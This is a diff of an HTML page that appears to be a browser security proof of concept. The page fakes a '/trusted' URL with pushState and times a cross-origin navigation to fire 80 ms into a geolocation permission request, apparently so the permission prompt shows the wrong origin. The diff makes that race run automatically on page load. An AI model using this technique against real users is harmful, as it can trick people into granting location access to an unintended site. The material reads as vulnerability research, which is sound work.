@@ -37,13 +37,6 @@ button {
   font-size: 13px;
   color: #b00020;
 }
-
-#status {
-  font-size: 13px;
-  margin-top: 10px;
-  color: #444;
-  word-break: break-word;
-}
 </style>
 </head>
 
@@ -57,9 +50,7 @@ button {
   <h2>Request Location</h2>
   <p>Tap the button below to request Geolocation permission.</p>
 
-  <button id="geoBtn">Get Location</button>
-
-  <p id="status">Status: idle</p>
+  <button onclick="getLocation()">Get Location</button>
   <p id="output">Location: -</p>
 
   <div class="notice">
@@ -71,10 +62,24 @@ button {
 const panel   = document.getElementById('panel');
 const trigger = document.getElementById('trigger');
 const output  = document.getElementById('output');
-const status  = document.getElementById('status');
-const geoBtn  = document.getElementById('geoBtn');
 
-let navigationScheduled = false;
+function getLocation() {
+  if (!navigator.geolocation) return;
+
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      // Extract latitude and longitude
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+
+      // Output both latitude and longitude
+      output.textContent = `Latitude: ${lat}, Longitude: ${lon}`;
+    },
+    () => {
+      output.textContent = 'Permission denied';
+    }
+  );
+}
 
 /*
  * Step 1:
@@ -83,52 +88,21 @@ let navigationScheduled = false;
 trigger.onclick = () => {
   history.pushState({}, '', '/trusted');
   panel.style.display = 'block';
-  status.textContent = 'Status: URL changed via pushState()';
 };
 
 /*
  * Step 2:
- * Trigger permission request, then race navigation
+ * Trigger a navigation race shortly after permission flow starts
  */
-geoBtn.onclick = () => {
-  if (!navigator.geolocation) {
-    status.textContent = 'Geolocation not supported';
-    return;
-  }
-
-  status.textContent = 'Status: requesting geolocation permission…';
-
-  navigator.geolocation.getCurrentPosition(
-    pos => {
-      const lat = pos.coords.latitude;
-      const lon = pos.coords.longitude;
-
-      const mapUrl = `https://maps.google.com/?q=${lat},${lon}`;
-
-      output.innerHTML = `
-        Latitude: ${lat}<br>
-        Longitude: ${lon}<br>
-        <a href="${mapUrl}" target="_blank">View on Google Maps</a>
-      `;
-
-      status.textContent = 'Status: location received';
-    },
-    err => {
-      status.textContent = 'Status: permission denied';
-      output.textContent = err.message;
-    }
-  );
-
-  // Schedule cross‑origin navigation shortly after permission flow starts
-  if (!navigationScheduled) {
-    navigationScheduled = true;
-
-    setTimeout(() => {
-      status.textContent = 'Status: navigating cross-origin…';
-      location.href = 'https://google.com:9090';
-    }, 80);
-  }
-};
+window.addEventListener('pageshow', () => {
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
+        location.href = 'https://google.com:9090';
+      }, 80);
+    });
+  });
+});
 </script>
 
 </body>
